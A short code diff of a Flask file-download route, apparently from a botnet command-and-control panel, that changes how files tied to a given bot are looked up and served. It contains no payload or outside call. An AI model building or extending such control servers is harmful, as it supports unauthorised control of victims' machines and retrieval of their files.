@@ -76,9 +76,15 @@ def download_file():
             return "No bot selected", 404
     elif request.method == 'GET':
         if 'file' in request.args:
+            if 'user' in request.args:
+                user = request.args.get('user')
+            else:
+                user = request.cookies.get('bot')
             filename = request.args.get('file')
-            if os.path.exists(os.path.join(DOWNLOAD_FOLDER,filename)):
-                return send_file(filename)
+
+            real_filename = botnet.getFileName(user,filename)
+            if real_filename:
+                return send_file(real_filename,attachment_filename=os.path.basename(filename))
             else:
                 return "File not found", 404
         else:
